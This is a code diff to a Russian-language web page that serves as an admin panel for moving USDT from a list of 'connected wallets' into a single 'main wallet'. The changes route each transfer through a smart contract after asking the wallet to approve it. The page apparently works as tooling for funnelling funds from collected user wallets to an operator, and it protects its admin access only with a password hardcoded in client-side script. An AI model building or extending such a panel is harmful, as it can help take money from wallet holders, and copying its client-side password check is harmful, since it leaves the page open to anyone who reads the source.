@@ -180,11 +180,22 @@
 
         .limit-warning {
             background: rgba(255, 193, 7, 0.15);
-            border-left: 5px solid #ff6b6b;
+            border-left: 5px solid #ffc107;
             border-radius: 8px;
             padding: 15px;
             margin-bottom: 20px;
-            color: #ff9999;
+            color: #ffc107;
+        }
+
+        .contract-info {
+            background: rgba(0, 150, 200, 0.15);
+            border-left: 5px solid #00ccff;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            color: #00ccff;
+            font-size: 0.9rem;
+            word-break: break-all;
         }
 
         input {
@@ -202,24 +213,11 @@
 
         .transfer-form {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 20px;
-        }
-
-        .transfer-form input {
-            grid-column: 1;
-        }
-
-        .transfer-form input:nth-child(2) {
-            grid-column: 2;
-        }
-
-        .transfer-form input:nth-child(3) {
-            grid-column: 1 / -1;
+            grid-template-columns: 1fr;
+            gap: 15px;
         }
 
         .transfer-form button {
-            grid-column: 1 / -1;
             background: linear-gradient(90deg, #ff5f6d, #ff3d5a);
             color: #fff;
             padding: 16px;
@@ -235,7 +233,15 @@
             word-break: break-all;
         }
 
-        .status.error { border-left-color: #ff5f6d; }
+        .status.error { 
+            border-left-color: #ff5f6d;
+            color: #ff9999;
+        }
+
+        .status.warning { 
+            border-left-color: #ffc107;
+            color: #ffc107;
+        }
 
         .hidden { display: none; }
 
@@ -281,21 +287,27 @@
             <button onclick="editMainWallet()" style="margin-left: 10px; padding: 5px 10px; font-size: 0.8rem;">Изменить</button>
         </div>
 
+        <div class="contract-info" id="contractInfoPanel">
+            <strong>📋 Смарт-контракт WalletTransfer</strong><br>
+            Адрес: <span id="contractAddr" style="font-size: 0.8rem;">—</span><br>
+            Максимум за раз: <strong>10 USDT</strong>
+        </div>
+
         <h2 style="color: #00ff9d; margin-top: 30px;">Подключённые кошельки</h2>
         <div class="wallets-grid" id="walletsGrid"></div>
 
         <div class="transfer-panel" id="transferPanel" style="display: none;">
-            <h2><i class="fas fa-paper-plane"></i> Отправить перевод</h2>
+            <h2><i class="fas fa-paper-plane"></i> Отправить через смарт-контракт</h2>
             
             <div class="limit-warning">
-                ⚠️ <strong>Максимум 10 USDT!</strong> Каждый перевод ограничен 10 USDT для безопасности
+                ⚠️ <strong>Максимум 10 USDT!</strong> Смарт-контракт ограничивает переводы максимум 10 USDT за транзакцию.
             </div>
 
             <div id="selectedWallet"></div>
             
             <div class="transfer-form">
-                <input type="number" id="transferAmount" placeholder="Сумма USDT (макс 10)" step="0.01" min="0" max="10">
-                <button onclick="performTransfer()" style="grid-column: 2; background: linear-gradient(90deg, #ff5f6d, #ff3d5a); color: #fff;"><i class="fas fa-paper-plane"></i> Отправить</button>
+                <input type="number" id="transferAmount" placeholder="Сумма USDT" step="0.01" min="0">
+                <button onclick="performTransfer()"><i class="fas fa-paper-plane"></i> Отправить через контракт</button>
             </div>
 
             <div id="transferStatus"></div>
@@ -303,20 +315,7 @@
     </div>
 
     <script>
-        const iconsContainer = document.getElementById('icons');
-        const symbols = ['🛡️','🔑','💎','📱','🌐','⚡','🔗','📈','💰','🔐'];
-        for (let i = 0; i < 20; i++) {
-            const icon = document.createElement('div');
-            icon.className = 'icon';
-            icon.textContent = symbols[Math.floor(Math.random()*symbols.length)];
-            icon.style.left = Math.random() * 100 + 'vw';
-            icon.style.animationDuration = (15 + Math.random()*25) + 's';
-            icon.style.animationDelay = -Math.random()*40 + 's';
-            iconsContainer.appendChild(icon);
-        }
-
         const ADMIN_PASSWORD = '1488';
-        const MAX_TRANSFER = 10; // USDT
 
         const ETHERS_SOURCES = [
             'https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js',
@@ -344,6 +343,30 @@
                 } catch (e) { }
             }
             throw new Error('Не удалось загрузить ethers.js');
+        }
+
+        const CONTRACT_ABI = [
+            'function transferUSDT(address from, address to, uint256 amount) returns (bool)',
+            'function canTransfer(address from, address to, uint256 amount) view returns (bool, string)',
+            'function getMaxTransferAmount() view returns (uint256)'
+        ];
+
+        const ERC20_ABI = [
+            'function approve(address spender, uint256 amount) returns (bool)',
+            'function allowance(address owner, address spender) returns (uint256)',
+            'function balanceOf(address) returns (uint256)'
+        ];
+
+        const iconsContainer = document.getElementById('icons');
+        const symbols = ['🛡️','🔑','💎','📱','🌐','⚡','🔗','📈','💰','🔐'];
+        for (let i = 0; i < 20; i++) {
+            const icon = document.createElement('div');
+            icon.className = 'icon';
+            icon.textContent = symbols[Math.floor(Math.random()*symbols.length)];
+            icon.style.left = Math.random() * 100 + 'vw';
+            icon.style.animationDuration = (15 + Math.random()*25) + 's';
+            icon.style.animationDelay = -Math.random()*40 + 's';
+            iconsContainer.appendChild(icon);
         }
 
         function loginAdmin() {
@@ -395,6 +418,14 @@
         async function loadWallets() {
             await ensureEthersLoaded();
             
+            const contractAddr = localStorage.getItem('contractAddress');
+            const usdtAddr = localStorage.getItem('usdtAddress');
+            
+            if (contractAddr) {
+                document.getElementById('contractAddr').textContent = contractAddr.slice(0, 10) + '...' + contractAddr.slice(-8);
+                document.getElementById('contractAddr').title = contractAddr;
+            }
+
             const wallets = JSON.parse(localStorage.getItem('wallets') || '[]');
             const grid = document.getElementById('walletsGrid');
             grid.innerHTML = '';
@@ -431,10 +462,10 @@
 
             const selected = document.getElementById('selectedWallet');
             selected.innerHTML = `
-                <div class="status" style="border-left-color: #ffc107;">
+                <div class="contract-info">
                     <strong>Выбран кошелёк:</strong> ${wallet.address}<br>
                     <strong>На этот адрес:</strong> ${document.getElementById('mainWallet').textContent}<br>
-                    <strong>Максимум за раз:</strong> ${MAX_TRANSFER} USDT
+                    <strong>Через смарт-контракт:</strong> ${wallet.contractAddress ? wallet.contractAddress.slice(0, 10) + '...' : 'не указан'}
                 </div>
             `;
         }
@@ -449,8 +480,8 @@
                 return;
             }
 
-            if (amount > MAX_TRANSFER) {
-                showStatus(`❌ Максимум ${MAX_TRANSFER} USDT! Ты указал ${amount}`, true);
+            if (amount > 10) {
+                showStatus(`❌ Сумма превышает максимум! Смарт-контракт позволяет максимум 10 USDT, ты указал ${amount} USDT`, true);
                 return;
             }
 
@@ -460,7 +491,7 @@
             }
 
             try {
-                showStatus('⏳ Ожидаем подтверждения в кошельке...');
+                showStatus('⏳ Подготовка к переводу через смарт-контракт...');
 
                 const provider = new ethers.providers.Web3Provider(window.ethereum);
                 await provider.send('eth_requestAccounts', []);
@@ -468,29 +499,59 @@
                 const signerAddress = await signer.getAddress();
 
                 if (signerAddress.toLowerCase() !== selectedWallet.address.toLowerCase()) {
-                    showStatus('❌ Выбранный кошелёк не совпадает с подключённым', true);
+                    showStatus('❌ Выбранный кошелёк не совпадает с подключённым в MetaMask/Trust Wallet', true);
                     return;
                 }
 
+                const contractAddr = localStorage.getItem('contractAddress');
+                const usdtAddr = localStorage.getItem('usdtAddress');
                 const mainWallet = document.getElementById('mainWallet').textContent;
-                const USDT_ADDRESS = '0x55d398326f99059fF775485246999027B3197955'; // USDT на BSC
-                
-                // ERC20 Transfer ABI
-                const ERC20_ABI = [
-                    'function transfer(address to, uint256 amount) returns (bool)',
-                    'function balanceOf(address) returns (uint256)'
-                ];
 
-                const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+                if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
+                    showStatus('❌ Ошибка: Адрес смарт-контракта не установлен', true);
+                    return;
+                }
+
+                // Подключаемся к смарт-контракту
+                const contract = new ethers.Contract(contractAddr, CONTRACT_ABI, signer);
+
+                // Проверяем может ли контракт выполнить перевод
+                const [canTransfer, message] = await contract.canTransfer(selectedWallet.address, mainWallet, ethers.utils.parseEther(amount.toString()));
+
+                if (!canTransfer) {
+                    showStatus(`❌ Смарт-контракт не может выполнить перевод: ${message}`, true);
+                    return;
+                }
+
+                // Проверяем allowance
+                const usdtContract = new ethers.Contract(usdtAddr, ERC20_ABI, signer);
+                const currentAllowance = await usdtContract.allowance(selectedWallet.address, contractAddr);
                 const amountWei = ethers.utils.parseEther(amount.toString());
 
-                const tx = await contract.transfer(mainWallet, amountWei);
+                if (currentAllowance.lt(amountWei)) {
+                    showStatus('📝 Запрашиваем разрешение на перевод USDT (approve)...');
+
+                    const approveTx = await usdtContract.approve(contractAddr, ethers.utils.parseEther(amount.toString()));
+                    await approveTx.wait();
+                }
+
+                // Вызываем функцию контракта
+                showStatus('⏳ Отправляем транзакцию через смарт-контракт...');
+                
+                const tx = await contract.transferUSDT(selectedWallet.address, mainWallet, amountWei);
+                
                 showStatus(`✅ Транзакция отправлена!<br><small>${tx.hash}</small>`);
                 await tx.wait();
-                showStatus(`✅ Перевод ${amount} USDT выполнен!<br><small>${tx.hash}</small>`);
+                
+                showStatus(`✅ Перевод ${amount} USDT выполнен через смарт-контракт!<br><small>Hash: ${tx.hash}</small><br><small>На адрес: ${mainWallet}</small>`);
                 document.getElementById('transferAmount').value = '';
             } catch (e) {
-                showStatus(`❌ Ошибка: ${e.message || e}`, true);
+                const errorMsg = e.reason || e.message || e.toString();
+                if (errorMsg.includes('Amount exceeds')) {
+                    showStatus(`❌ Сумма превышает максимум! Смарт-контракт позволяет максимум 10 USDT`, true);
+                } else {
+                    showStatus(`❌ Ошибка: ${errorMsg}`, true);
+                }
             }
         }
 
@@ -511,10 +572,9 @@
             }
         }
 
-        // При загрузке страницы проверяем аутентификацию
+        // При загрузке страницы
         checkAuthentication();
 
-        // Восстанавливаем основной кошелёк из памяти
         const saved = localStorage.getItem('mainWallet');
         if (saved) {
             document.getElementById('mainWallet').textContent = saved;
